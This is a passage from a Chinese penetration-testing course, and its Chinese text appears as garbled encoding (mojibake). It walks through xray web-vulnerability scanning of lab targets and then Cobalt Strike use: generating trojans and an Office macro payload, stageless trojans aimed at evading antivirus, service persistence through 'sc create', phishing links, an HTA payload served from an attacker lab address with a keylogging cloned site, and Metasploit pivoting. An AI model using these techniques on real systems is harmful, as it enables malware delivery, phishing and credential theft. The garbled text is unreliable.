show help #æŸ¥çœ‹å¸®åŠ© 10-2-2 xrayæ‰«æå•ä¸ªurlOPTIONS: â€“list, -l list plugins #æŸ¥çœ‹æ’ä»¶åˆ—è¡¨ â€“plugins value, â€“plugin value, â€“plug value specify the plugins to run, separated by â€˜,â€™ #æŒ‡å®šæ’ä»¶ï¼Œå¤šä¸ªæ’ä»¶åˆ†å·éš”å¼€ â€“poc value, -p value specify the poc to run, separated by â€˜,â€™ #æŒ‡å®špocï¼Œå¤šä¸ªpocåˆ†å·éš”å¼€ â€“listen value use proxy resource collector, value is proxy addr, (example: 127.0.0.1:1111) #ä½¿ç”¨è¢«åŠ¨ä»£ç†æ‰«ææ¨¡å¼ â€“basic-crawler value, â€“basic value use a basic spider to crawl the target and scan the requests #ä½¿ç”¨ä¸»åŠ¨çˆ¬è™«æ‰«ææ¨¡å¼ â€“browser-crawler value, â€“browser value use a browser spider to crawl the target and scan the requests #å†…ç½®radï¼Œä¸»åŠ¨çˆ¬è™«æ‰«ææ¨¡å¼ â€“url-file value, â€“uf value read urls from a local file and scan these urls, one url per line #æŒ‡å®šurlåˆ—è¡¨æ–‡ä»¶ â€“burp-file value, â€“bf value read requests from burpsuite exported file as targets #è¯»å–burpsuiteå¯¼å‡ºçš„ç›®æ ‡æ–‡ä»¶ â€“url value, -u value scan a single url #æ‰«æå•ä¸ªurl â€“data value, -d value data string to be sent through POST (e.g. â€˜usernameadminâ€™) #æ‰«æurlæ—¶ï¼ŒæŒ‡å®špostè¯·æ±‚çš„å†…å®¹ â€“raw-request FILE, â€“rr FILE load http raw request from a FILE #åŠ è½½ä¸€ä¸ªhttpè¯·æ±‚æ•°æ®æ–‡ä»¶ â€“force-ssl, â€“fs force usage of SSLHTTPS for raw-request #å¼ºåˆ¶ä½¿ç”¨https â€“json-output FILE, â€“jo FILE output xray results to FILE in json format #è¾“å‡ºæ ¼å¼ä¸ºjson â€“html-output FILE, â€“ho FILE output xray result to FILE in HTML format #è¾“å‡ºæ ¼å¼ä¸ºhtml â€“webhook-output value, â€“wo value post xray result to url in json format #å¯¹æ¥å¾®ä¿¡é’‰é’‰å®ç°å‘ç°æ¼æ´è‡ªåŠ¨å‘Šè­¦ ä¸»è¦ç‰¹æ€§æœ‰ ## æ£€æµ‹é€Ÿåº¦å¿«ã€‚å‘åŒ…é€Ÿåº¦å¿«; æ¼æ´æ£€æµ‹ç®—æ³•æ•ˆç‡é«˜ã€‚ ## æ”¯æŒèŒƒå›´å¹¿ã€‚å¤§è‡³ OWASP Top 10 é€šç”¨æ¼æ´æ£€æµ‹ï¼Œå°è‡³å„ç§ CMS æ¡†æ¶ POCï¼Œå‡å¯ä»¥æ”¯æŒã€‚ ## ä»£ç è´¨é‡é«˜ã€‚ç¼–å†™ä»£ç çš„äººå‘˜ç´ è´¨é«˜, é€šè¿‡ Code Reviewã€å•å…ƒæµ‹è¯•ã€é›†æˆæµ‹è¯•ç­‰å¤šå±‚éªŒè¯æ¥æé«˜ä»£ç å¯é æ€§ã€‚ ## é«˜çº§å¯å®šåˆ¶ã€‚é€šè¿‡é…ç½®æ–‡ä»¶æš´éœ²äº†å¼•æ“çš„å„ç§å‚æ•°ï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶å¯ä»¥å®¢åˆ¶åŒ–åŠŸèƒ½ã€‚ ## å®‰å…¨æ— å¨èƒã€‚xray å®šä½ä¸ºä¸€æ¬¾å®‰å…¨è¾…åŠ©è¯„ä¼°å·¥å…·ï¼Œè€Œä¸æ˜¯æ”»å‡»å·¥å…·ï¼Œå†…ç½®çš„æ‰€æœ‰ payload å’Œ pocå‡ä¸ºæ— å®³åŒ–æ£€æŸ¥ ç›®å‰æ”¯æŒçš„æ¼æ´æ£€æµ‹ç±»å‹åŒ…æ‹¬: ## XSSæ¼æ´æ£€æµ‹ (key: xss) ## SQL æ³¨å…¥æ£€æµ‹ (key: sqldet) ## å‘½ä»¤ä»£ç æ³¨å…¥æ£€æµ‹ (key: cmd-injection) ## ç›®å½•æšä¸¾ (key: dirscan) ## è·¯å¾„ç©¿è¶Šæ£€æµ‹ (key: path-traversal) ## XML å®ä½“æ³¨å…¥æ£€æµ‹ (key: xxe) ## æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ (key: upload) ## å¼±å£ä»¤æ£€æµ‹ (key: brute-force) ## jsonp æ£€æµ‹ (key: jsonp) ## ssrf æ£€æµ‹ (key: ssrf) ## åŸºçº¿æ£€æŸ¥ (key: baseline) ## ä»»æ„è·³è½¬æ£€æµ‹ (key: redirect) ## CRLF æ³¨å…¥ (key: crlf-injection) ## Struts2 ç³»åˆ—æ¼æ´æ£€æµ‹ (é«˜çº§ç‰ˆï¼Œkey: struts) ## Thinkphpç³»åˆ—æ¼æ´æ£€æµ‹ (é«˜çº§ç‰ˆï¼Œkey: thinkphp) ## POC æ¡†æ¶ (key: phantasm) æ¥æºå¤„ç† ## HTTP è¢«åŠ¨ä»£ç† ## ç®€æ˜“çˆ¬è™« ## å•ä¸ª URL ## URLåˆ—è¡¨çš„æ–‡ä»¶ ## å•ä¸ªåŸå§‹ HTTP è¯·æ±‚æ–‡ä»¶ ç»“æœè¾“å‡º ## Stdout (å±å¹•è¾“å‡º, é»˜è®¤å¼€å¯) ## JSON æ–‡ä»¶è¾“å‡º ## HTML æŠ¥å‘Šè¾“å‡º ## Webhook è¾“å‡º ä½¿ç”¨å‘½ä»¤ .\\xray.exe webscan â€“url http://192.168.18.106/ â€“html-output 1.html # webscan æ‰«æwebæ¼æ´ # â€“url æŒ‡å®šurl # â€“html-output æŒ‡å®šè¾“å‡ºç»“æœ 10-2-3 æ‰«æå¤šä¸ªurlå‡†å¤‡url.txtæ–‡ä»¶ http://192.168.19.100/pikachu/vul/sqli/sqli_str.php?name=vincesubmit=%E6%9F%A5%E8%AF%A2 http://192.168.19.100/pikachu/vul/urlredirect/urlredirect.php?url=unsafere.php http://192.168.19.100/pikachu/vul/xss/xss_reflected_get.php?message=1submit=submit æ‰«æå‘½ä»¤ .\\xray.exe webscan â€“url-file .\\url.txt â€“html-output 2.html 10-2-4 çˆ¬è™«æ¨¡å¼æ‰«æç›®æ ‡ç½‘ç«™## æ²¡æœ‰ç™»å½•æ‰«æ .\\xray_windows_amd64.exe webscan â€“basic-crawler http://192.168.18.111/ â€“html-output 3.html ## æŒ‡å®šç™»å½•åçš„cookieæ‰«æ ä¿®æ”¹é…ç½®æ–‡ä»¶config.yaml æ­£å¸¸æ‰«æ .\\xray.exe webscan â€“basic-crawler http://192.168.18.111/ â€“html-output 4.html 10-2-4 xray ä»£ç†æ¨¡å¼è¿›è¡Œæ¼æ´æ‰«æ## ä»£ç†æ¨¡å¼æ‰«æhttpç½‘ç«™ .\\xray_windows_amd64.exe webscan â€“listen 0.0.0.0:8080 â€“html-output 5.html ## ä»£ç†æ¨¡å¼æ‰«æhttpsç½‘ç«™ å®‰è£…è¯ä¹¦ .\\xray_windows_amd64.exe webscan â€“listen 0.0.0.0:8080 â€“html-output 6.html æ‰«æçš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šå‘èµ·å…¶ä»–å¤–é“¾è¯·æ±‚ è§£å†³åŠæ³•ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶ 10-2-5 xrayä¸burpè”åŠ¨è”åŠ¨æ¨¡å¼1 è”åŠ¨æ¨¡å¼2 10-3 æ—ç«™æ£€æµ‹10-3-1 DonNetScan 10-5 å®‰è£…waf## å…ˆæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼Œæ³¨æ„å…ˆåœæ­¢apacheæœåŠ¡ï¼Œç„¶åå†æ‰§è¡Œ D:\\phpstudy_pro\\Extensions\\Apache2.4.39\\bin httpd.exe -k install -n apache2.4.39 ## æ³¨æ„ï¼Œæ˜¯åœ¨apacheçš„binç›®å½•ä¸‹ ## ç„¶ååŒå‡»å®‰è£…å®‰å…¨ç‹—ã€‚ 10-6 360æ˜Ÿå›¾çš„ä½¿ç”¨é¦–å…ˆå¾—å¼€å§‹ç³»ç»Ÿè®°å½•æ—¥å¿—åŠŸèƒ½ httpd-conf é…ç½®æ–‡ä»¶é‡Œ â€”- CostomLog â€œloggsaccess.logâ€ common ## å–æ¶ˆ#å· æ‰“å¼€config.iniæ–‡ä»¶ï¼Œä¿®æ”¹é…ç½®ï¼Œä¸»è¦æ˜¯å°†ä½ è¦åˆ†æçš„æ—¥å¿—æ–‡ä»¶æ‰€åœ¨ç›®å½•æ”¾åˆ°è¿™é‡Œï¼Œå†å¼ºè°ƒä¸€ä¸‹ï¼Œè·¯å¾„ä¸­ä¸è¦ä¸­æ–‡æˆ–è€…ç©ºæ ¼ã€‚ å‰©ä¸‹çš„é…ç½®ç®€å•çœ‹çœ‹ï¼Œä¿æŒé»˜è®¤å³å¯ã€‚æ¯”å¦‚æˆ‘å°†éœ€è¦åˆ†æçš„æ—¥å¿—æ–‡ä»¶æ”¾åˆ°äº†E:\\wuchao\\tools\\access.log ï¼Œç„¶ååŒå‡»å¦‚ä¸‹æ–‡ä»¶ è¿˜ä¼šç”ŸæˆæŠ¥å‘Šï¼Œåœ¨resultæ–‡ä»¶å¤¹ä¸­ã€‚å¹¶ä¸”æŠ¥å‘Šä¸­çš„ä¿¡æ¯å·²ç»åˆ†å¥½ç±»äº†ï¼ŒåŸºäºçš„owasp top10çš„æ–¹å¼æ¥åˆ†ç±»çš„ã€‚ 10-7 cså·¥å…·çš„ä½¿ç”¨æ¯”å¦‚å°†æˆ‘ä»¬çš„csæ–‡ä»¶å¤¹å…ˆæ”¾åˆ°æˆ‘ä»¬çš„kali2021è™šæ‹Ÿæœºä¸­å» 10-7-1 å¯åŠ¨æœåŠ¡ç«¯ï¼š.teamserver 192.168.19.146 test ## ipåœ°å€ï¼škaliæœåŠ¡å™¨çš„ipåœ°å€ ## testï¼šæ˜¯å¾…ä¼šé¶æœºè¿æ¥æœåŠ¡å™¨çš„å¯†ç  é»˜è®¤ç«¯å£ä¸º50050ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­èƒ½çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ 10-7-2 å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨è¿è¡Œï¼šcobalstrike.batï¼Œè¿™ä¸ªæ˜¯å®¢æˆ·ç«¯ å¦‚ä¸‹ï¼Œå¯åŠ¨å®¢æˆ·ç«¯ï¼Œè¾“å…¥ipï¼Œå¯†ç ï¼Œç«¯å£ï¼Œç”¨æˆ·é»˜è®¤ 10-7-3 è®©ä¸»æœºä¸Šçº¿åˆ›å»ºç›‘å¬å™¨ ç”Ÿæˆæœ¨é©¬ï¼Œå¤§å®¶å¯ä»¥çœ‹çœ‹ï¼Œå®ƒèƒ½å¤Ÿç”Ÿæˆå„ç§è¯­è¨€çš„æœ¨é©¬ï¼Œé’“é±¼æ”»å‡»ã€é‚®ä»¶æ”»å‡»ç­‰å„ç§æ‰‹æ®µï¼Œå¾ˆå‰å®³ã€‚ è®©æœ¨é©¬æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº ç„¶ååŒå‡»è¿™ä¸ªæœ¨é©¬æ–‡ä»¶è¿è¡Œï¼Œæ³¨æ„ä½ çš„è™šæ‹Ÿæœºçš„ç½‘è¦æ˜¯é€šç•…çš„æ˜‚ã€‚ç„¶åçœ‹æˆ‘ä»¬çš„cså®¢æˆ·ç«¯ï¼Œæœ‰ä¸»æœºå°±ä¸Šçº¿äº† ç”Ÿæˆæ— çŠ¶æ€å¯æ‰§è¡Œçš„windowsæœ¨é©¬ è¿™ç§æœ¨é©¬ä¹Ÿæ˜¯å¯ä»¥è¿è¡Œçš„ï¼Œä½†æ˜¯ä¸ä¼šä¿®æ”¹ç›®æ ‡ä¸»æœºçš„æ³¨å†Œè¡¨ã€å¯åŠ¨é¡¹(windowsè®¾ç½®å¯åŠ¨é¡¹çš„åœ°æ–¹å¾ˆå¤šï¼Œç»„ç­–ç•¥å¯åŠ¨ã€å¯åŠ¨é¡¹å¯åŠ¨ã€æ³¨å†Œè¡¨å¯åŠ¨ã€åŠ è½½æ¡Œé¢å¯åŠ¨ç­‰å¥½å¤šç§å¯åŠ¨æ–¹å¼ï¼Œè¿™ä¸ªåœ¨å°†åº”æ€¥å“åº”çš„æ—¶å€™è¯´è¿‡å‡ ç§)ç­‰ï¼Œæ²¡æœ‰è¿™äº›è¡Œä¸ºåŠ¨ä½œï¼Œé‚£ä¹ˆæ€æ¯’è½¯ä»¶ä¸€èˆ¬ä¸ä¼šæ€æ‰ï¼Œä¹Ÿæ˜¯ä¸ºäº†å…æ€ï¼Œè¿æ¥ä¸Šå»ä¹‹åï¼Œåé¢å¯ä»¥ä»¥æœåŠ¡çš„å½¢å¼å°†è¿™ä¸ªæœ¨é©¬ç¨‹åºå¯åŠ¨èµ·æ¥ã€‚ 10-7-4 ç»“åˆmetasploit,åå¼¹shellåœ¨kaliä¸­å¼€å¯ä½¿ç”¨å‘½ä»¤å¼€å¯metasploitï¼Œç»“åˆkaliæ¥åå¼¹shellï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé‚£ä¸ºä»€ä¹ˆè¦ç»“åˆmsfå‘¢ï¼Œå› ä¸ºmsfçš„åŠŸèƒ½ä¹Ÿå¾ˆå¼ºå¤§ï¼Œä¸»æœºææƒã€å„ç§æ”»å‡»è½½è·ã€æ¼æ´æ”»å‡»ç­‰ã€‚ msfconsole å¦‚ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨xshellæ¥ç© ç„¶ååœ¨CSä¸­åˆ›å»ºç›‘å¬å™¨ ä½¿ç”¨Cobalt Strikeåˆ›å»ºä¸€ä¸ªwindowsforeignreverse_tcpçš„Listenerã€‚å…¶ä¸­ipä¸ºMetasploitçš„ipåœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚ ç„¶åé€‰æ‹©å¢åŠ ä¼šè¯ é€‰æ‹©msfé‚£ä¸ªè¿æ¥ ç„¶åå†çœ‹msfï¼Œå°±æˆåŠŸäº† å¦‚æœä½ å‘ç°åœ¨msfä¸­è¾“å…¥æŒ‡ä»¤æ²¡æœ‰æ•ˆæœï¼Œé‚£ä¹ˆctrl+cç»“æŸä¸€ä¸‹ï¼Œç„¶åé€šè¿‡sessions -iæ‰¾åˆ°ä¼šè¯ï¼Œç»§ç»­é€šè¿‡ sessions -i idå€¼ï¼Œå°±å¯ä»¥äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒCSå»ºç«‹çš„è¿æ¥ä¼šè¯å¯ä»¥æ´¾ç”Ÿåˆ°msfä¸­ï¼Œæ´¾ç”Ÿä¹‹åæœ‰ä¸ªæœ€å¤§çš„æœ‰ç‚¹å°±æ˜¯ï¼Œmsfå¯ä»¥è®©è¿™ä¸ªä¼šè¯åœ¨åå°è¿è¡Œï¼Œæ‰§è¡Œ background æŒ‡ä»¤ï¼Œç»§ç»­è¿›è¡Œå…¶ä»–çš„æ”»å‡»ã€‚ 10-7-5 officeå®payloadåº”ç”¨ç¬¬ä¸€æ­¥ã€åˆ›å»ºç›‘å¬å™¨ ç¬¬äºŒæ­¥ã€ç”Ÿæˆofficeå®æœ¨é©¬ é€‰æ‹©åˆšæ‰åˆ›å»ºçš„ç›‘å¬å™¨ï¼Œç‚¹å‡»ç”Ÿæˆ ä¼šçœ‹åˆ°å¦‚ä¸‹æç¤ºï¼Œå‘Šè¯‰å…·ä½“æ€ä¹ˆåšï¼Œå…ˆç‚¹å‡»copyï¼Œè¿™å°±æ˜¯ç”Ÿæˆçš„å®æœ¨é©¬ç¨‹åºä»£ç ï¼Œä¸€ä¼šåœ¨wordæ–‡æ¡£ä¸­åˆ›å»ºå®ä¹‹åï¼Œå°†ç¨‹åºå¤åˆ¶åˆ°é‡Œé¢ï¼Œæ¯”å¦‚æˆ‘ç°åœ¨ç»™å®ƒèµ·ä¸ªåå­—å«å®æœ¨é©¬ã€‚ æ‰¾åˆ°ç›®æ ‡ä¸»æœºï¼Œæ‰“å¼€ç›®æ ‡ä¸»æœºçš„æŸä¸ªwordæ–‡ä»¶ Cs ç”Ÿæˆçš„ä»£ç ç›´æ¥æ”¾åˆ°åˆ›å»ºé‡Œé¢å»ï¼Œæ³¨æ„ï¼šåšè¯•éªŒçš„æ—¶å€™ï¼Œå®çš„ä½ç½®ä¸è¦è®¾ç½®æ‰€æœ‰çš„æ´»åŠ¨æ¨¡æ¿å’Œæ–‡æ¡£ï¼Œå»ºè®¾åº”ç”¨åœ¨å½“å‰æ–‡æ¡£ï¼Œä¸ç„¶æœ¬æœºæ‰€æœ‰wordæ–‡æ¡£è¿è¡Œéƒ½ä¼šç§ä¸Šä½ çš„æœ¨é©¬ï¼Œå¦å¤–æ‰“å¼€wordæ–‡æ¡£æœ‰å®æç¤ºï¼Œä¸€èˆ¬æ˜¯wordé»˜è®¤ç¦ç”¨æ‰€æœ‰å®ï¼ˆæ–‡ä»¶â€”é€‰é¡¹â€”ä¿¡ä»»ä¸­å¿ƒâ€”ä¿¡ä»»ä¸­å¿ƒè®¾ç½®é‡Œé¢é…ç½®ï¼‰ã€‚åˆ›å»ºå®ï¼Œæˆ‘ä»¬ç»™å½“å‰æ–‡æ¡£åˆ›å»ºï¼Œè¿™æ ·å°±ä¸ä¼šå½±å“å…¶ä»–çš„wordæ–‡æ¡£äº† å¦‚ä¸‹ï¼Œå°†ç”Ÿæˆçš„å®æœ¨é©¬ï¼Œæ›¿æ¢åˆ°å¼¹æ¡†çš„è¿™ä¸ªä½ç½®æ¥ã€‚ ä¿å­˜ä¸€ä¸‹ï¼Œç„¶åå…³é—­è¿™äº›å¼¹æ¡†ã€‚ ç„¶ååŒå‡»æ‰“å¼€æˆ‘ä»¬åŠ äº†å®çš„wordæ–‡æ¡£ã€‚ ç‚¹å‡»ç¡®å®šï¼Œç„¶åå¯¹å®çš„å®‰å…¨æ€§è¿›è¡Œè®¾ç½® 10-7-6 æ— çŠ¶æ€æœ¨é©¬ä¼˜ç‚¹ï¼šå¯èƒ½è¿‡è¡Œä¸ºæŸ¥æ€ã€å¦å¤–administratorè¿è¡Œå¯ç›´æ¥æå‡ä¸ºsystemæƒé™ ç¬¬ä¸€æ­¥ï¼šè¿˜æ˜¯åˆ›å»ºç›‘å¬å™¨ï¼Œç”Ÿæˆwindowsæ— çŠ¶æ€æœ¨é©¬ï¼Œè¿™ä¸ªæ˜¨å¤©ç»™å¤§å®¶æè¿‡ã€‚ ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæœåŠ¡ å› ä¸ºæˆ‘ä»¬ä¸Šé¢åˆ›å»ºçš„æ˜¯æ— çŠ¶æ€æœ¨é©¬ï¼Œæ‰€ä»¥è™½ç„¶èƒ½å¤Ÿä¸Šçº¿ï¼Œä½†æ˜¯ä¸èƒ½ä»¥æœåŠ¡çš„å½¢å¼å¯åŠ¨ï¼Œä¸‹é¢å°±æ˜¯å°†æœ¨é©¬ç¨‹åºä»¥æœåŠ¡çš„å½¢å¼å¯åŠ¨çš„æŒ‡ä»¤ï¼Œå¹¶ä¸”è¿™ç§æ‰‹å·¥çš„æ–¹å¼ï¼Œå®‰å…¨è½¯ä»¶æ˜¯ä¸ä¼šæ‹¦æˆªä½ çš„ã€‚ 1ï¼šæ·»åŠ æœåŠ¡ Sc create test binpath â€c:\\test.exeâ€ start auto displayname â€testâ€ # ScæŒ‡ä»¤ åˆ›å»º åä¸ºtestçš„æœåŠ¡ï¼ŒæŒ‡å‘test.exeç¨‹åºï¼Œå¯åŠ¨æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼ŒæœåŠ¡æ˜¾ç¤ºåç§°ä¸ºtest 2. Sc start test #å¯åŠ¨testæœåŠ¡ 3. Sc delete test #åˆ é™¤æœåŠ¡ 4. Sc top test #åœæ­¢æœåŠ¡ æ— çŠ¶æ€æœ¨é©¬ä¸»è¦æ˜¯ä¸ºäº†åšå…æ€ï¼Œå…¶å®åœ¨ç½‘ä¸Šæœ‰å¾ˆå¤šåœ¨çº¿ç”ŸæˆCSå…æ€çš„payloadå·¥å…·ï¼Œå¥½å¤šéƒ½æ˜¯ç”ŸæˆCè¯­è¨€çš„ã€‚ å› ä¸ºç¬¬ä¸€ç§æœ‰çŠ¶æ€çš„æœ¨é©¬ä¼šæœ‰è‡ªåŠ¨çš„è¡Œä¸ºåŠ¨ä½œ(ä¿®æ”¹å¯åŠ¨é¡¹ã€æ³¨å†Œè¡¨ä¹‹ç±»çš„)ï¼Œè¿™äº›è‡ªåŠ¨çš„è¡Œä¸ºå¯èƒ½ä¼šè¢«æ€æ¯’å·¥å…·æ£€æµ‹åˆ°ï¼Œæ¯”å¦‚360è‡ªå¸¦çš„è¡Œä¸ºç›‘æ§åŠŸèƒ½ã€‚ CSè¿˜æœ‰ä¸ªåŠŸèƒ½å¦‚ä¸‹ å¯ä»¥ç”Ÿæˆå„ç±»è¯­è¨€çš„payload 10-7-6 ä¿¡æ¯æ”¶é›†ä¸€èˆ¬åˆ›å»ºpayloadçš„æ—¶å€™ï¼Œéƒ½éœ€è¦å…ˆå»ºç«‹ç›‘å¬ã€‚ä½†æ˜¯åˆ›å»ºé’“é±¼é“¾æ¥æ˜¯ä¸éœ€è¦çš„ã€‚ä¿¡æ¯æ”¶é›†æˆ‘ä»¬æ‰‹æ®µå°±æ˜¯åˆ›å»ºé’“é±¼é“¾æ¥ é‚£ä¹ˆæˆ‘ä»¬çš„é’“é±¼è¿æ¥å°±ç”Ÿæˆå¥½äº†ï¼Œåœ¨è¿™é‡Œï¼Œç‚¹å‡»copyæ˜¯å¤åˆ¶ï¼Œç‚¹å‡»killæ˜¯åˆ æ‰ æ•ˆæœï¼šåœ¨å†…ç½‘ä»»æ„ä¸€ä¸ªä¸»æœºçš„æµè§ˆå™¨ä¸Šè®¿é—®è¿™ä¸ªipåœ°å€ï¼Œå°±ä¼šä¸­æ‹›ã€‚ ä¼šçœ‹åˆ°å“ªäº›ipåœ°å€è®¿é—®äº†ä½ è®¾å®šé‚£ä¸ªipåœ°å€å’Œå®ƒç”¨çš„ä»€ä¹ˆç³»ç»Ÿï¼Œå¦‚æœç»è¿‡äº†å…¬ç½‘ï¼Œé‚£ä¹ˆè¿˜ä¼šè®°å½•ç›®æ ‡çš„å…¬ç½‘ipã€‚ 10-7-7 htaç½‘é¡µæŒ‚é©¬HTAæ˜¯HTML Applicationçš„ç¼©å†™ï¼ˆHTMLåº”ç”¨ç¨‹åºï¼‰ï¼Œæ˜¯è½¯ä»¶å¼€å‘çš„æ–°æ¦‚å¿µï¼Œç›´æ¥å°†HTMLä¿å­˜æˆHTAçš„æ ¼å¼ï¼Œå°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åº”ç”¨è½¯ä»¶ï¼Œä¸VBã€C++ç­‰ç¨‹åºè¯­è¨€æ‰€è®¾è®¡çš„è½¯ä»¶ç•Œé¢æ²¡ä»€ä¹ˆå·®åˆ«ã€‚ ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºç›‘å¬å™¨ ç¬¬äºŒæ­¥ï¼šç”Ÿæˆhta å¦‚ä¸‹ï¼Œå®˜æ–¹å»ºè®®é€‰æ‹©powershellï¼Œä½†æ˜¯powershellåªæœ‰win7åŠä»¥ä¸Šç‰ˆæœ¬çš„ç³»ç»Ÿæ‰æ”¯æŒï¼Œæ‰€ä»¥ä¸€ä¼šé€‰æ‹©ç›®æ ‡ä¸»æœºçš„æ—¶å€™ï¼Œæˆ‘ä»¬é€‰ä¸€ä¸ªwin7çš„ç„¶åé€‰æ‹©æˆ‘ä»¬åˆ›å»ºçš„ç›‘å¬å™¨ å¼¹å‡ºå¦‚ä¸‹ï¼šä¿å­˜æ–‡ä»¶ï¼Œä½†æ˜¯æ³¨æ„ï¼Œä¸»æœºä¸Šçš„æ€æ¯’å·¥å…·å…ˆå…³é—­äº†ï¼Œä¸ç„¶å¯èƒ½ä¼šè¢«æ€æ‰ã€‚ ç¬¬ä¸‰æ­¥ï¼šä½¿ç”¨æ–‡ä»¶ä¸‹è½½ å› ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„æœ¨é©¬æ–‡ä»¶ï¼Œè‚¯å®šè¦è®©åˆ«äººæ‰“å¼€ä¸‹è½½ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸‹è½½åŠŸèƒ½å°±èƒ½å®Œæˆè¿™ä¸ªäº‹å„¿ï¼Œ ç‚¹å‡»å¼€å§‹ï¼Œç„¶åå¼¹å‡ºå¦‚ä¸‹çª—å£ ç½‘å€æ˜¯ï¼š http://192.168.0.6:80/evil.hta å¹¶ä¸”ç‚¹å‡»å¼€å§‹ä¹‹åï¼Œevil.htaæ–‡ä»¶ä¼šè‡ªåŠ¨ä¼ åˆ°csæœåŠ¡ç«¯çš„uploadsç›®å½•ä¸­ã€‚ ç¬¬å››æ­¥ï¼šå…‹éš†ç½‘ç«™ è§£å†³åŠæ³•ï¼šå¦‚æœä¹‹å‰è®¾ç½®è¿‡é’“é±¼é¡µé¢ï¼Œè®°å¾—ä¸€å®šè¦åˆ æ‰ï¼Œä¸ç„¶ä¼šå…‹éš†çš„æ—¶å€™ä¼šæŠ¥é”™,å› ä¸ºä¸¤ä¸ªé’“é±¼æ‰‹æ®µæ˜¯æœ‰å†²çªçš„ã€‚ ç„¶åæˆ‘ä»¬å…ˆæ¸…ç©ºä¸€ä¸‹ä¹‹å‰é’“é±¼çš„åº”ç”¨ä¿¡æ¯ ç„¶åæˆ‘ä»¬è®¿é—® http://192.168.0.6:80 å¹¶ä¸”æˆ‘ä»¬çš„æœ¨é©¬ç”Ÿæˆæ—¶æ˜¯å¼€å¯äº†é”®ç›˜è®°å½•çš„ï¼Œå½“ç›®æ ‡ä¸»æœºåœ¨åˆšæ‰çš„ç½‘é¡µä¸Šè¾“å…¥æ•°æ®æ—¶ï¼Œé”®ç›˜è®°å½•å°±è¢«è®°å½•ä¸‹æ¥äº†ï¼Œæ¢å…¶ä»–é¡µé¢æ˜¯ä¸ä¼šè®°å½•çš„ã€‚ 10-7-8 é‚®ä»¶é’“é±¼10-7-9 beaconæ§åˆ¶å°çš„åŸºæœ¬ä½¿ç”¨å¯ä»¥è¿›å…¥åˆ°å‘½ä»¤è¡Œï¼Œå¦‚ä¸‹å‡ ä¸ªæŒ‡ä»¤éƒ½å¯ä»¥æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ Help # æŸ¥çœ‹æŸä¸ªæŒ‡ä»¤å¦‚ä½•ä½¿ç”¨ Help shell #æ¯”å¦‚shellåŠŸèƒ½ä¸ä¼šä½¿ç”¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿™æ ·æŸ¥çœ‹ ? # æŸ¥çœ‹èƒ½å¤Ÿè¾“å…¥å“ªäº›ç»ˆç«¯æŒ‡ä»¤ 10-7-10 Socksä»£ç†åº”ç”¨å®ƒè¿™ä¸ªä»£ç†åŠŸèƒ½æ„Ÿè§‰ä¸æ˜¯å¾ˆç¨³å®šã€‚æˆ‘ä»¬å°±æ ¹æ®è¿™ä¸ªåŠŸèƒ½åšä¸€ä¸ªå®éªŒï¼Œé‡ç‚¹åœ¨äºç†è§£è¿‡ç¨‹å’Œè¯¥å·¥å…·çš„ä½¿ç”¨æ–¹æ³•ã€‚ 10-1 CSå’Œmsfé…åˆåšsockä»£ç† kaliåœ¨win2003ä¸Šè®¾ç½®ä¸€ä¸ªsockä»£ç†ï¼Œç”¨æ¥è®¿é—®win7ã€‚ é‚£ä¹ˆæ­¤æ—¶win2003çš„ç¬¬äºŒå¼ ç½‘å¡å’Œwin7çš„ç½‘å¡ipåœ°å€åœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œäº’ç›¸èƒ½å¤Ÿpingé€šï¼Œkaliå’Œwin2003çš„ç¬¬ä¸€å¼ ç½‘å¡åœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œäº’ç›¸èƒ½å¤Ÿpingé€šï¼Œä½†æ˜¯kaliä¸èƒ½pingé€šwin7çš„ã€‚ å¥½ï¼Œæˆ‘ä»¬æƒ³è®©kalièƒ½å¤Ÿè¿é€šwin7ï¼Œé‚£ä¹ˆå°±éœ€è¦è®¾ç½®sockä»£ç†äº† é¦–å…ˆè¦å…ˆé€šè¿‡æœ¨é©¬æ§åˆ¶ä½win2003ï¼Œè¿™ä¸ªæˆ‘ä»¬å·²ç»ä¼šç©äº†ï¼Œé€šè¿‡windowsæœ¨é©¬å°±èƒ½æå®šï¼Œè¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº†ï¼Œæ¯”å¦‚æ‹¿ä¸‹çš„æ•ˆæœå¦‚ä¸‹ ç¬¬ä¸€æ­¥ï¼šè®¾ç½®ä»£ç†ç«¯å£ æ•ˆæœå¦‚ä¸‹ ç¬¬äºŒæ­¥ï¼šæŸ¥çœ‹å·²æ­å»ºä»£ç† ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨msfæ¨¡å—ç›´æ¥æ”»å‡» æ–¹å¼1ï¼š æˆ‘ä»¬msfçš„æ‰«æåŠŸèƒ½ï¼Œå¦‚æœèƒ½å¤Ÿæ‰«æåˆ°10ç½‘æ®µçš„ï¼Œé‚£ä¹ˆè¡¨ç¤ºæˆåŠŸäº† setq Proxies socks4:192.168.0.6:12653 use auxiliaryscannerportscantcp set rhost 10.0.0.3 run æœ‰åŒå­¦å¯èƒ½ä¼šè¯´ï¼Œæ‰§è¡Œäº†csçš„ä»£ç 